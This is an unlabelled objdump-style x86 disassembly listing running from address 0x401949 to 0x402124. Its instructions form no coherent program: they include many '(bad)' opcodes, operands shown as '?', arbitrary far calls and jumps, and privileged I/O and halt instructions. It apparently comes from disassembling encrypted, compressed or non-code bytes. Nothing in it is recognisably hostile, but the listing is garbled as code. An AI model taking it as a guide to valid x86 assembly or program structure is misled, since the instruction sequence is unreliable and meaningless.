  40194b:	(bad)  
  40194d:	adc    DWORD PTR [edi-0x6ceaf0e7],eax
  401953:	xor    al,BYTE PTR [ecx]
  401955:	adc    ebx,DWORD PTR [edi-0x27]
  401958:	sbb    bl,ch
  40195a:	enter  0xcaff,0x2f
  40195e:	sbb    dh,BYTE PTR [edi-0x5f]
  401961:	mov    esp,0x639f5311
  401966:	imul   ebx,DWORD PTR ds:0x9b4524d7,0xffffff89
  40196d:	sub    al,0x72
  40196f:	cwde   
  401970:	(bad)  
  401971:	call   0xfd40:0xa76ad6e0
  401978:	add    dl,BYTE PTR [ebp-0x17]
  40197b:	jno    0x40192a
  40197d:	js     0x40191d
  40197f:	pop    esi
  401980:	or     dl,bh
  401982:	es or  edx,edi
  401985:	cmp    bh,BYTE PTR [edx]
  401987:	ret    0x70ab
  40198a:	loop   0x401998
  40198c:	pop    ss
  40198d:	mov    bl,0x0
  40198f:	jb     0x40195a
  401991:	test   bl,bl
  401993:	test   BYTE PTR [ecx+0x72c16c7e],cl
  401999:	push   0x39
  40199b:	enter  0x2441,0xdd
  40199f:	adc    eax,0x83f84f6b
  4019a4:	bound  eax,QWORD PTR [edx-0x49]
  4019a7:	sub    BYTE PTR [edx+0x1f4e295a],bl
  4019ad:	add    al,0xd0
  4019af:	loope  0x4019f2
  4019b1:	mov    DWORD PTR [edi+0x6e],esi
  4019b4:	leave  
  4019b5:	imul   eax,DWORD PTR [eax],0x14
  4019b8:	call   0xe8cf:0x51608827
  4019bf:	push   eax
  4019c0:	out    0x22,al
  4019c2:	pop    edx
  4019c3:	mov    DWORD PTR [edx+0x464607c6],edx
  4019c9:	mov    edi,0x4cc16efb
  4019ce:	test   eax,0xc743d06a
  4019d3:	mov    dh,0x87
  4019d5:	cmp    BYTE PTR [esi+0x5],cl
  4019d8:	mov    DWORD PTR [edi-0x71abae36],esp
  4019de:	icebp  
  4019df:	stc    
  4019e0:	out    dx,al
  4019e1:	in     eax,dx
  4019e2:	adc    bh,BYTE PTR [eax]
  4019e4:	inc    DWORD PTR [ebx-0x28]
  4019e7:	bound  esi,QWORD PTR [ebx+0x28]
  4019ea:	jmp    0x8945:0x454d62ee
  4019f1:	jmp    0x4019cc
  4019f3:	cmp    DWORD PTR [ebx+0x7f],0x46
  4019f7:	(bad)  
  4019f8:	mov    eax,ds:0xbf782a1
  4019fd:	jecxz  0x4019d8
  4019ff:	inc    esi
  401a00:	cli    
  401a01:	es jae 0x401a01
  401a04:	push   cs
  401a05:	cmp    eax,0xd0f1a60c
  401a0a:	sub    BYTE PTR [esi+ecx*1+0x29],ah
  401a0e:	stos   BYTE PTR es:[edi],al
  401a0f:	mov    cl,0x79
  401a11:	mov    ds:0x36e29c1b,eax
  401a16:	jge    0x4019b6
  401a18:	fimul  DWORD PTR [eax+0x6d7d81f5]
  401a1e:	pusha  
  401a1f:	mov    ch,0x82
  401a21:	jmp    0x4019f1
  401a23:	xor    BYTE PTR [eax+0x7d9cdeb7],ah
  401a29:	jl     0x4019b8
  401a2b:	jg     0x401a7b
  401a2d:	inc    eax
  401a2e:	bound  ebx,QWORD PTR [edi+ebx*4+0x5ee5da89]
  401a35:	inc    esi
  401a36:	out    0x4a,eax
  401a38:	out    dx,al
  401a39:	frstor [edx]
  401a3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a3c:	shr    BYTE PTR [ebx],1
  401a3e:	mov    al,ds:0xe8e9da78
  401a43:	pop    edi
  401a44:	ins    DWORD PTR es:[edi],dx
  401a45:	sub    eax,0x97aec9a9
  401a4a:	test   eax,0x44f126bd
  401a4f:	jae    0x4019fb
  401a51:	mov    bh,0x4f
  401a53:	and    eax,0xac7a82b3
  401a58:	stos   DWORD PTR es:[edi],eax
  401a59:	lahf   
  401a5a:	inc    esp
  401a5b:	ss in  eax,dx
  401a5d:	adc    cl,cl
  401a5f:	retf   0x93ed
  401a62:	sub    ebp,0xffffff8f
  401a65:	rcl    ebp,1
  401a67:	push   ebp
  401a68:	test   eax,0xf98d1526
  401a6d:	subps  xmm1,XMMWORD PTR [ebx]
  401a70:	imul   ebx,DWORD PTR [ecx+0x735cd440],0x532865b7
  401a7a:	push   es
  401a7b:	sub    BYTE PTR [esi+0x6c],dh
  401a7e:	push   esp
  401a7f:	pop    edi
  401a80:	rcr    BYTE PTR [eax+0x2dedaa6b],cl
  401a86:	xor    dh,dh
  401a88:	pusha  
  401a89:	mov    al,ds:0xcddce21c
  401a8e:	adc    al,0x65
  401a90:	jmp    0xa585:0x9e42a25e
  401a97:	imul   edi,DWORD PTR [edi-0x46],0x6d0f509d
  401a9e:	adc    al,0x47
  401aa0:	fwait
  401aa1:	je     0x401b16
  401aa3:	cdq    
  401aa4:	les    edx,FWORD PTR [edx-0x29]
  401aa7:	adc    al,0x8c
  401aa9:	push   edi
  401aaa:	(bad)  
  401aab:	fsubr  DWORD PTR [ecx+ebx*8]
  401aae:	jns    0x401a91
  401ab0:	xchg   bl,ch
  401ab2:	jle    0x401acb
  401ab4:	ss es jmp 0x401a6f
  401ab8:	and    ebx,ecx
  401aba:	mov    edi,0x532dce6a
  401abf:	add    esp,DWORD PTR [ebp-0x5f44b395]
  401ac5:	retf   0x4b5d
  401ac8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ac9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401aca:	icebp  
  401acb:	je     0x401af7
  401acd:	mov    ?,si
  401ad0:	or     al,ah
  401ad2:	push   ss
  401ad3:	out    0xed,eax
  401ad5:	call   0x46f:0xbab14631
  401adc:	xor    al,0x12
  401ade:	shr    BYTE PTR [ebx],0x22
  401ae1:	gs rcr eax,1
  401ae4:	xchg   ebx,eax
  401ae5:	jb     0x401a96
  401ae7:	pop    ebp
  401ae8:	mov    edi,0x5c7c7bef
  401aed:	in     al,0xd0
  401aef:	loop   0x401a72
  401af1:	mov    ecx,0xf9e23308
  401af6:	cmp    DWORD PTR [eax-0x62],eax
  401af9:	cvtdq2ps xmm4,XMMWORD PTR [esi+0x443561ae]
  401b00:	fadd   QWORD PTR [esi]
  401b02:	retf   
  401b03:	jp     0x401a8f
  401b05:	sbb    al,0xdd
  401b07:	je     0x401b55
  401b09:	loopne 0x401a95
  401b0b:	bound  eax,QWORD PTR [edx]
  401b0d:	js     0x401b88
  401b0f:	and    al,0x7b
  401b11:	imul   esp,DWORD PTR [ebx],0xa62354f
  401b17:	ficom  DWORD PTR [ecx-0x42f9ba2a]
  401b1d:	xchg   DWORD PTR [edi+0x728c85cc],esi
  401b23:	lock jae 0x401ada
  401b26:	mov    bl,0xb9
  401b28:	xor    BYTE PTR [edx-0x2f],al
  401b2b:	pushf  
  401b2c:	loop   0x401b7d
  401b2e:	lods   eax,DWORD PTR ds:[esi]
  401b2f:	fisubr DWORD PTR [ebx]
  401b31:	mov    ecx,0xcdaea744
  401b36:	daa    
  401b37:	shl    DWORD PTR [ebp-0x60b2f67],cl
  401b3d:	xchg   edx,eax
  401b3e:	fbld   TBYTE PTR [ebx+0x7b]
  401b41:	add    DWORD PTR [ecx],0x3c
  401b44:	arpl   WORD PTR [edx-0x5a],ax
  401b47:	push   cs
  401b48:	inc    eax
  401b49:	imul   ebx,esi,0x66
  401b4c:	mov    esi,DWORD PTR [esi]
  401b4e:	pop    es
  401b4f:	out    0x3c,eax
  401b51:	sbb    eax,0xd3e05c73
  401b56:	pop    ebp
  401b57:	int    0x63
  401b59:	mov    ecx,0x68b666a
  401b5e:	aas    
  401b5f:	vpavgb ymm4,ymm0,YMMWORD PTR [edx-0x8]
  401b64:	repnz repnz fstp TBYTE PTR [esi+0x78]
  401b69:	mov    ecx,0xcf205da9
  401b6e:	jle    0x401afd
  401b70:	popa   
  401b71:	sbb    al,0x10
  401b73:	xchg   ebp,eax
  401b74:	xchg   esi,eax
  401b75:	add    al,0xa0
  401b77:	sbb    ecx,ebx
  401b79:	pop    ebp
  401b7a:	push   edx
  401b7b:	ins    DWORD PTR es:[edi],dx
  401b7c:	sbb    al,0xa9
  401b7e:	push   ebx
  401b7f:	xor    eax,0x3beff032
  401b84:	pop    edi
  401b85:	sub    al,0x50
  401b87:	(bad)  
  401b88:	lock dec eax
  401b8a:	xlat   BYTE PTR ds:[ebx]
  401b8b:	adc    ecx,DWORD PTR [eax]
  401b8d:	dec    esp
  401b8e:	mov    ebx,esp
  401b90:	jbe    0x401b12
  401b92:	int    0x68
  401b94:	push   0xc0a288bb
  401b99:	jmp    0x401bec
  401b9b:	or     DWORD PTR fs:[ebp-0x2c4b6897],0xbcfdb100
  401ba6:	push   ebx
  401ba7:	sahf   
  401ba8:	nop
  401ba9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401baa:	repnz mov edi,0xee25d4e4
  401bb0:	iret   
  401bb1:	pop    ecx
  401bb2:	repnz ins DWORD PTR es:[edi],dx
  401bb4:	fneni(8087 only) 
  401bb6:	mov    edx,0x7444a23f
  401bbb:	xor    al,0x8b
  401bbd:	cmp    al,0x17
  401bbf:	leave  
  401bc0:	sub    ch,0x75
  401bc3:	dec    ebx
  401bc4:	iret   
  401bc5:	(bad)  
  401bc6:	rol    DWORD PTR [edi],1
  401bc8:	das    
  401bc9:	iret   
  401bca:	test   al,0x3d
  401bcc:	aaa    
  401bcd:	add    ah,BYTE PTR [esi+0x4d40ebb1]
  401bd3:	push   edi
  401bd4:	cli    
  401bd5:	fisttp WORD PTR [esi+0x2f]
  401bd8:	sub    ecx,edx
  401bda:	inc    esi
  401bdb:	adc    esp,DWORD PTR [edi+0x6]
  401bde:	outs   dx,DWORD PTR ds:[esi]
  401bdf:	call   0xa22db63f
  401be4:	test   dl,bl
  401be6:	shl    DWORD PTR [ecx],0x67
  401be9:	hlt    
  401bea:	pop    eax
  401beb:	adc    DWORD PTR [edx],ebx
  401bed:	(bad)  
  401bee:	(bad)  
  401bef:	int3   
  401bf0:	sub    BYTE PTR [edx+eiz*8],dl
  401bf3:	jno    0x401c67
  401bf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401bf6:	popa   
  401bf7:	jecxz  0x401bff
  401bf9:	push   eax
  401bfa:	mov    ch,0xeb
  401bfc:	cmc    
  401bfd:	xlat   BYTE PTR ds:[ebx]
  401bfe:	inc    ebp
  401bff:	adc    DWORD PTR [edx-0x8],0xfffffffa
  401c03:	add    ecx,DWORD PTR [edx+esi*2-0x43]
  401c07:	sub    bh,ah
  401c09:	push   esi
  401c0a:	mov    ch,0x61
  401c0c:	pop    edi
  401c0d:	sbb    DWORD PTR [edi+0x6a09e5a0],ebp
  401c13:	(bad)  
  401c14:	jp     0x401c0c
  401c16:	add    ecx,DWORD PTR [ebp-0x2c]
  401c19:	repnz or esp,DWORD PTR [edx+0x10]
  401c1d:	icebp  
  401c1e:	push   0x43
  401c20:	adc    ah,0x75
  401c23:	dec    ebx
  401c24:	jmp    0x401c5c
  401c26:	pusha  
  401c27:	jge    0x401c8a
  401c29:	mov    dh,ch
  401c2b:	mov    ch,0xd
  401c2d:	pop    es
  401c2e:	jno    0x401bbf
  401c30:	add    al,0x62
  401c32:	adc    BYTE PTR [ecx],dl
  401c34:	les    edi,FWORD PTR [ebp+0x24]
  401c37:	mov    esi,0xb2cb6631
  401c3c:	add    DWORD PTR [esi-0x4a],ebp
  401c3f:	jl     0x401c5a
  401c41:	inc    esi
  401c42:	adc    BYTE PTR [esi+ebp*4],bh
  401c45:	shl    DWORD PTR [ebx+eiz*4],0x96
  401c49:	fisubr WORD PTR [edi]
  401c4b:	push   0x45
  401c4d:	ins    DWORD PTR es:[edi],dx
  401c4e:	fmul   QWORD PTR [ebx+0x75492cf4]
  401c54:	or     bl,0x52
  401c57:	cs ins DWORD PTR es:[edi],dx
  401c59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c5a:	xchg   esi,eax
  401c5b:	loopne 0x401bfd
  401c5d:	mov    dl,0x63
  401c5f:	jmp    0x8523:0x93d8e804
  401c66:	pop    ebx
  401c67:	pusha  
  401c68:	test   al,0xd7
  401c6a:	scas   eax,DWORD PTR es:[edi]
  401c6b:	stc    
  401c6c:	jo     0x401ca3
  401c6e:	scas   al,BYTE PTR es:[edi]
  401c6f:	adc    eax,0xacea332a
  401c74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c75:	arpl   WORD PTR [ebx-0x6],cx
  401c78:	jno    0x401c32
  401c7a:	pop    eax
  401c7b:	jg     0x401cc1
  401c7d:	and    eax,0xf98cea27
  401c82:	pop    esp
  401c83:	outs   dx,BYTE PTR ds:[esi]
  401c84:	add    BYTE PTR [eax],ch
  401c86:	jmp    0xfbdb73fb
  401c8b:	ret    0x566c
  401c8e:	bsr    ebx,ebp
  401c91:	sub    al,BYTE PTR [esi+0x19]
  401c94:	dec    ecx
  401c95:	call   0xc544:0x3b4b5f01
  401c9c:	add    eax,0xae402df0
  401ca1:	mov    eax,ds:0xf9ec10be
  401ca6:	pop    es
  401ca7:	push   esp
  401ca8:	jne    0x401cf7
  401caa:	adc    edi,0xffffffe8
  401cad:	js     0x401d0b
  401caf:	sbb    DWORD PTR [edi],eax
  401cb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cb2:	xchg   ebx,eax
  401cb3:	fwait
  401cb4:	dec    edx
  401cb5:	ret    
  401cb6:	pop    es
  401cb7:	iret   
  401cb8:	mov    ?,esi
  401cba:	(bad)  
  401cbb:	test   DWORD PTR [edi-0x7f9685f4],0x1b7709ac
  401cc5:	push   ss
  401cc6:	jecxz  0x401d32
  401cc8:	push   es
  401cc9:	leave  
  401cca:	xchg   ebx,eax
  401ccb:	jo     0x401c83
  401ccd:	test   DWORD PTR ds:[eax],eax
  401cd0:	fsub   DWORD PTR [esp+ebp*4+0x26]
  401cd4:	add    al,0x48
  401cd6:	xchg   esi,esi
  401cd8:	shl    DWORD PTR [edi-0x4f0329ed],1
  401cde:	mov    ds:0x3acf7bf7,eax
  401ce3:	lahf   
  401ce4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ce5:	test   al,0x61
  401ce7:	mov    dh,0x7b
  401ce9:	inc    ebx
  401cea:	iret   
  401ceb:	add    al,0xfe
  401ced:	adc    dl,BYTE PTR [ebp+0x612c7326]
  401cf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cf4:	(bad)  
  401cf6:	ins    BYTE PTR es:[edi],dx
  401cf7:	fidivr DWORD PTR [esi+0x2b]
  401cfa:	and    al,0x47
  401cfc:	cmp    eax,0x32414df1
  401d01:	loope  0x401d53
  401d03:	or     DWORD PTR gs:[edi+0x26],0x72
  401d08:	fld    TBYTE PTR [edi+0x2f]
  401d0b:	sbb    eax,0x64fc9025
  401d10:	loopne 0x401c97
  401d12:	dec    eax
  401d13:	sub    ah,dl
  401d15:	sbb    bh,BYTE PTR [ecx-0x27]
  401d18:	push   edx
  401d19:	jecxz  0x401cd4
  401d1b:	outs   dx,BYTE PTR ds:[esi]
  401d1c:	mov    esi,0xb45b760
  401d21:	pop    ds
  401d22:	mov    WORD PTR [ebp-0x29b02017],gs
  401d28:	or     bl,bl
  401d2a:	mov    dl,0xfd
  401d2c:	jmp    0x9261:0xce3cbb23
  401d33:	or     al,0xb4
  401d35:	jno    0x401d1a
  401d37:	hlt    
  401d38:	mov    BYTE PTR [ebp+0x62],0x9c
  401d3c:	(bad)  
  401d3d:	fucomp st(0)
  401d3f:	add    eax,0xa5d5daa9
  401d44:	hlt    
  401d45:	ror    DWORD PTR [esi-0x4be08dd4],1
  401d4b:	rcl    ecx,0xe0
  401d4e:	shr    BYTE PTR [eax+ebx*4-0x472554bf],cl
  401d55:	loopne 0x401d19
  401d57:	mov    ds:0xd530218f,eax
  401d5c:	fcomi  st,st(2)
  401d5e:	rcl    DWORD PTR [edx+0x5c],cl
  401d61:	outs   dx,BYTE PTR ds:[esi]
  401d62:	das    
  401d63:	push   ebx
  401d64:	outs   dx,BYTE PTR ds:[esi]
  401d65:	clc    
  401d66:	jo     0x401d11
  401d68:	adc    DWORD PTR [edx+0x2],0x451630f4
  401d6f:	ret    
  401d70:	and    DWORD PTR [ebp+edx*2-0x386ee800],esp
  401d77:	pop    DWORD PTR ds:0xd28caa09
  401d7d:	push   ebp
  401d7e:	xchg   esi,eax
  401d7f:	std    
  401d80:	int3   
  401d81:	mov    ch,0xe7
  401d83:	sbb    ch,0x47
  401d86:	ins    BYTE PTR es:[edi],dx
  401d87:	sar    BYTE PTR [edx],1
  401d89:	jmp    0xab485a30
  401d8e:	mov    BYTE PTR [edx-0x36080391],dl
  401d94:	push   eax
  401d95:	(bad)  
  401d96:	inc    ebx
  401d97:	jno    0x401e10
  401d99:	(bad)  
  401d9b:	push   ebp
  401d9c:	rol    DWORD PTR [ecx+0x4e32afe9],cl
  401da2:	jl     0x401d88
  401da4:	push   esp
  401da5:	rcl    DWORD PTR [eax-0x4c4e8ef1],1
  401dab:	push   0x7dd06b2b
  401db0:	sub    cl,BYTE PTR [edx-0x74]
  401db3:	call   0xdf2ecccd
  401db8:	mov    esp,0xa65d429c
  401dbd:	inc    esi
  401dbe:	and    dh,BYTE PTR [edi+0x53]
  401dc1:	xor    BYTE PTR [ecx],0xd2
  401dc4:	std    
  401dc5:	push   edi
  401dc6:	mov    ebp,DWORD PTR [eax+0x4d9d082b]
  401dcc:	push   ds
  401dcd:	or     edx,DWORD PTR [ecx+0x61]
  401dd0:	mov    ds:0x426ad05b,al
  401dd5:	sbb    bh,cl
  401dd7:	jbe    0x401e03
  401dd9:	jmp    0x640a:0xf8540d9e
  401de0:	cmp    edx,DWORD PTR [esi]
  401de2:	jg     0x401e5e
  401de4:	adc    al,BYTE PTR [edx-0x3b4e5f92]
  401dea:	pusha  
  401deb:	imul   esi
  401ded:	cmp    eax,0xf0ba4a6
  401df2:	aam    0x8d
  401df4:	xor    al,0x2f
  401df6:	mov    ebx,0x97e6ccde
  401dfb:	ret    
  401dfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401dfd:	fcom   QWORD PTR [eax+0x2e]
  401e00:	retf   
  401e01:	mov    eax,ds:0x9c9d9395
  401e06:	lods   eax,DWORD PTR ds:[esi]
  401e07:	icebp  
  401e08:	push   ss
  401e09:	or     dl,al
  401e0b:	popa   
  401e0c:	in     eax,0xc4
  401e0e:	and    esi,ebx
  401e10:	ds push ebp
  401e12:	adc    bh,BYTE PTR [ebx+0x5bba57d5]
  401e18:	mov    cl,0x83
  401e1a:	dec    ecx
  401e1b:	push   esp
  401e1c:	jmp    FWORD PTR [edx]
  401e1e:	push   ds
  401e1f:	cwde   
  401e20:	popf   
  401e21:	out    dx,eax
  401e22:	repz xor al,0x8d
  401e25:	or     eax,0x811a94be
  401e2a:	mov    ch,0xa2
  401e2c:	push   ebp
  401e2d:	inc    ebx
  401e2e:	cmp    bh,0x4a
  401e31:	pop    ecx
  401e32:	fdivr  QWORD PTR [ebx+0x36f011f9]
  401e38:	scas   eax,DWORD PTR es:[edi]
  401e39:	les    ebx,FWORD PTR [esi-0x185f6311]
  401e3f:	mov    ds:0x72e1998d,al
  401e44:	jge    0x401e8f
  401e46:	pushf  
  401e47:	inc    ebx
  401e48:	stos   BYTE PTR es:[edi],al
  401e49:	xchg   edi,eax
  401e4a:	bswap  eax
  401e4c:	aam    0x9a
  401e4e:	pop    edi
  401e4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e50:	jb     0x401e02
  401e52:	push   eax
  401e53:	pop    esp
  401e54:	jae    0x401dec
  401e56:	jnp    0x401df3
  401e58:	pop    ecx
  401e59:	loopne 0x401e12
  401e5b:	test   al,0x4e
  401e5d:	xchg   BYTE PTR ds:0xa85a1f63,cl
  401e63:	cmc    
  401e64:	mov    eax,ds:0xaae513a5
  401e69:	push   es
  401e6a:	jg     0x401ed4
  401e6c:	push   ebp
  401e6d:	loop   0x401e25
  401e6f:	fwait
  401e70:	(bad)  
  401e71:	loopne 0x401e96
  401e73:	or     eax,0xd324c84
  401e78:	retf   0x84ad
  401e7b:	xor    edx,DWORD PTR [esi]
  401e7d:	or     dh,al
  401e7f:	loope  0x401ecf
  401e81:	add    BYTE PTR [ebx-0x1b],ch
  401e84:	ja     0x401e18
  401e86:	enter  0x53b5,0xef
  401e8a:	addr16 mov ebx,0xcfd5192b
  401e90:	mov    edx,DWORD PTR [ecx]
  401e92:	mov    bh,0x88
  401e94:	in     al,dx
  401e95:	pop    ebx
  401e96:	out    dx,eax
  401e97:	leave  
  401e98:	repz int 0x4b
  401e9b:	and    al,0x7f
  401e9d:	sub    eax,eax
  401e9f:	jns    0x401f20
  401ea1:	sub    eax,0x45069e85
  401ea6:	or     edi,0xffffffb5
  401ea9:	cmp    BYTE PTR [ecx+0x20],bl
  401eac:	mov    al,ah
  401eae:	add    BYTE PTR [ebp-0x50],dl
  401eb1:	js     0x401e57
  401eb3:	sahf   
  401eb4:	(bad)  
  401eb5:	mov    eax,0x9f48da3b
  401eba:	(bad)  
  401ebb:	stc    
  401ebc:	jne    0x401f3b
  401ebe:	mov    edi,0xc94ab0b5
  401ec3:	das    
  401ec4:	sub    DWORD PTR [esi],edi
  401ec6:	cmp    eax,0xf3afd00e
  401ecb:	cdq    
  401ecc:	xor    esi,edi
  401ece:	xchg   esi,eax
  401ecf:	(bad)  
  401ed0:	in     eax,dx
  401ed1:	cld    
  401ed2:	into   
  401ed3:	fld    DWORD PTR [edx+0x62]
  401ed6:	movnti DWORD PTR [esi-0x2c],eax
  401eda:	jl     0x401ebf
  401edc:	jl     0x401ead
  401ede:	(bad)  
  401edf:	mov    al,ds:0xc32ddac4
  401ee4:	jns    0x401ef1
  401ee6:	push   eax
  401ee7:	cld    
  401ee8:	shl    bl,1
  401eea:	popf   
  401eeb:	mov    bh,0x93
  401eed:	scas   al,BYTE PTR es:[edi]
  401eee:	or     cl,cl
  401ef0:	fistp  WORD PTR [ebp-0x45feb39c]
  401ef6:	in     eax,dx
  401ef7:	rcr    bl,0x5e
  401efa:	inc    eax
  401efb:	mov    eax,ds:0xdf88793c
  401f00:	xchg   esp,eax
  401f01:	dec    ebx
  401f02:	jmp    0xd7f4239
  401f07:	adc    eax,0xe0cfde1d
  401f0c:	jbe    0x401f61
  401f0e:	jmp    0x1874:0xcb7f15ac
  401f15:	je     0x401ec9
  401f17:	pop    ss
  401f18:	adc    bh,ah
  401f1a:	ret    0x3028
  401f1d:	aas    
  401f1e:	aad    0x8d
  401f20:	push   edx
  401f21:	xor    al,0x97
  401f23:	stos   BYTE PTR es:[edi],al
  401f24:	jmp    0xa560:0xb687746b
  401f2b:	aam    0x45
  401f2d:	push   ebp
  401f2e:	push   cs
  401f2f:	mov    al,0x5f
  401f31:	in     eax,dx
  401f32:	fdiv   QWORD PTR [edx]
  401f34:	mov    ds:0xe4d8edc4,al
  401f39:	xor    eax,DWORD PTR [edi]
  401f3b:	iret   
  401f3c:	jmp    0x401ef9
  401f3e:	jno    0x401eef
  401f40:	call   DWORD PTR [edi]
  401f42:	and    al,0xc4
  401f44:	push   ds
  401f45:	rcr    esp,1
  401f47:	repz test al,0x87
  401f4a:	into   
  401f4b:	(bad)  
  401f4c:	popf   
  401f4d:	pop    ds
  401f4e:	repz and dl,BYTE PTR [eax]
  401f51:	stos   DWORD PTR es:[edi],eax
  401f52:	neg    DWORD PTR fs:[esi]
  401f55:	cld    
  401f56:	outs   dx,DWORD PTR ds:[esi]
  401f57:	(bad)  
  401f58:	sti    
  401f59:	jg     0x401f44
  401f5b:	mov    ecx,0x42716ea3
  401f60:	and    DWORD PTR [ebp+0x66],esi
  401f63:	sub    BYTE PTR [ebp-0x55a893a],cl
  401f69:	xchg   ebx,eax
  401f6a:	push   ebp
  401f6b:	ja     0x401fa9
  401f6d:	push   edi
  401f6e:	adc    edi,DWORD PTR [ecx]
  401f70:	sub    DWORD PTR [ebx],0xffffffbb
  401f73:	jmp    0x746b:0xe520c238
  401f7a:	xchg   DWORD PTR [ecx],edi
  401f7c:	xor    BYTE PTR [edx],bh
  401f7e:	jle    0x401fd5
  401f80:	push   0x0
  401f82:	icebp  
  401f83:	pusha  
  401f84:	pusha  
  401f85:	enter  0xdeed,0x3
  401f89:	enter  0xb9b0,0x74
  401f8d:	push   edx
  401f8e:	lea    esp,gs:[edx-0x4024829d]
  401f95:	and    al,0xed
  401f97:	pop    es
  401f98:	push   eax
  401f99:	psrlq  mm2,mm1
  401f9c:	xchg   DWORD PTR [ebx+ecx*4-0x215d22eb],ecx
  401fa3:	das    
  401fa4:	xchg   ebx,eax
  401fa5:	ja     0x401f8d
  401fa7:	loope  0x401fb7
  401fa9:	xor    bl,BYTE PTR [edx-0x465add3c]
  401faf:	call   0x5e3a8be3
  401fb4:	add    BYTE PTR [edi+0xd83e346],dl
  401fba:	ret    
  401fbb:	loopne 0x401ff5
  401fbd:	cwde   
  401fbe:	xchg   ecx,eax
  401fbf:	or     al,BYTE PTR [esi-0x3942607a]
  401fc5:	and    cl,ch
  401fc7:	out    dx,eax
  401fc8:	inc    ecx
  401fc9:	xlat   BYTE PTR ds:[ebx]
  401fca:	sahf   
  401fcb:	cmp    BYTE PTR [edi*8+0x4c7e6f83],0xd4
  401fd3:	fwait
  401fd4:	jae    0x401fe8
  401fd6:	inc    esi
  401fd7:	arpl   WORD PTR [esi],sp
  401fd9:	xor    DWORD PTR [ebp-0x3deb073a],ebp
  401fdf:	fwait
  401fe0:	(bad)  
  401fe1:	xor    ah,dh
  401fe3:	xchg   DWORD PTR [edi-0x1b34846c],eax
  401fe9:	or     DWORD PTR [esi-0x20],ecx
  401fec:	add    al,0x78
  401fee:	pop    ss
  401fef:	mov    ebx,0xd50b0e0f
  401ff4:	xchg   ecx,eax
  401ff5:	sub    BYTE PTR [edi-0x2c1d1fa7],ch
  401ffb:	retf   0x99f
  401ffe:	call   DWORD PTR [esi]
  402000:	and    BYTE PTR [ecx+0x3a0d01],cl
  402006:	imul   esi,DWORD PTR [edx-0x6052c9e0],0xe4508097
  402010:	hlt    
  402011:	jmp    0x2e7e3d7d
  402016:	pop    edi
  402017:	sub    al,0x4b
  402019:	xchg   ebp,eax
  40201a:	pop    ds
  40201b:	jmp    0x402055
  40201d:	mov    ebp,0xb5b12225
  402022:	dec    ecx
  402023:	pop    ds
  402024:	lods   al,BYTE PTR ds:[esi]
  402025:	ja     0x40201e
  402027:	std    
  402028:	cmp    esp,DWORD PTR [esi+eiz*2-0x6f]
  40202c:	pop    edi
  40202d:	repz icebp 
  40202f:	sub    eax,0xa9a9736f
  402034:	sub    ah,0x86
  402037:	mov    al,ds:0x2fada7dc
  40203c:	cld    
  40203d:	into   
  40203e:	aad    0xc6
  402040:	xchg   ebx,eax
  402041:	jnp    0x40201d
  402043:	aam    0x68
  402045:	add    BYTE PTR [ebx+0x3b18e979],dl
  40204b:	sahf   
  40204c:	cmp    al,0x9f
  40204e:	cmp    dh,0xb5
  402051:	or     al,0x7
  402053:	push   eax
  402054:	mov    eax,0xad0be2a2
  402059:	adc    eax,0xd32475ae
  40205e:	fisttp QWORD PTR [ecx-0x78]
  402061:	aad    0x76
  402063:	jmp    0x6d8b92c8
  402068:	aam    0x84
  40206a:	fidivr DWORD PTR [ebp+eiz*2+0x5]
  40206e:	call   0xf263:0xc0186b59
  402075:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402076:	mov    DWORD PTR ds:0xc40632ca,edx
  40207c:	xchg   ebx,eax
  40207d:	sub    al,0xcf
  40207f:	call   0x7edc:0xcb271be3
  402086:	pop    edi
  402087:	rcr    ebp,0x72
  40208a:	inc    ecx
  40208b:	xchg   edi,eax
  40208c:	sub    eax,0x9f51e589
  402091:	mov    esp,0x7e15a69d
  402096:	sbb    esi,DWORD PTR [eax-0x1103c513]
  40209c:	push   edi
  40209d:	je     0x402113
  40209f:	rcr    edx,1
  4020a1:	jg     0x4020fb
  4020a3:	pop    ebp
  4020a4:	cwde   
  4020a5:	test   eax,0x2f78b080
  4020aa:	mov    dl,0xb3
  4020ac:	push   ebx
  4020ad:	add    dl,BYTE PTR [ecx+0x12568908]
  4020b3:	mov    ebx,0x34006ca4
  4020b8:	jns    0x4020d2
  4020ba:	and    esp,DWORD PTR [ebp-0x19aa5e8f]
  4020c0:	adc    al,0xe0
  4020c2:	sahf   
  4020c3:	je     0x4020fe
  4020c5:	test   BYTE PTR [esi+0x6fcb6aa4],ah
  4020cb:	push   cs
  4020cc:	in     al,0x84
  4020ce:	retf   
  4020cf:	xor    eax,0x64f6754b
  4020d4:	inc    ebp
  4020d5:	aad    0xb4
  4020d7:	xchg   esi,eax
  4020d8:	mov    eax,ds:0xb49e82d7
  4020dd:	jo     0x402087
  4020df:	mov    al,0x71
  4020e1:	cdq    
  4020e2:	mov    ebx,0x540f1962
  4020e7:	inc    edi
  4020e8:	xchg   ecx,eax
  4020e9:	adc    eax,0x7a2f9673
  4020ee:	jl     0x402117
  4020f0:	aaa    
  4020f1:	test   DWORD PTR [edi-0x3bb678e2],ecx
  4020f7:	lods   al,BYTE PTR ds:[esi]
  4020f8:	ret    0x2bdf
  4020fb:	jo     0x402110
  4020fd:	xchg   edx,eax
  4020fe:	(bad)  
  4020ff:	cmp    dl,bl
  402101:	mov    ebp,0x8ab7ff95
  402106:	in     eax,dx
  402107:	and    DWORD PTR [ecx+edx*4],ecx
  40210a:	fidivr WORD PTR [ecx]
  40210c:	out    0xc5,eax
  40210e:	repz fnsave [esi-0x75bd5c85]
  402115:	jmp    FWORD PTR [eax]
  402117:	repnz int3 
  402119:	xor    BYTE PTR [edi+0x41a75956],0x23
  402120:	jge    0x402111
  402122:	cs inc edx
  402124:	mov    edx,0x6b51bcaa
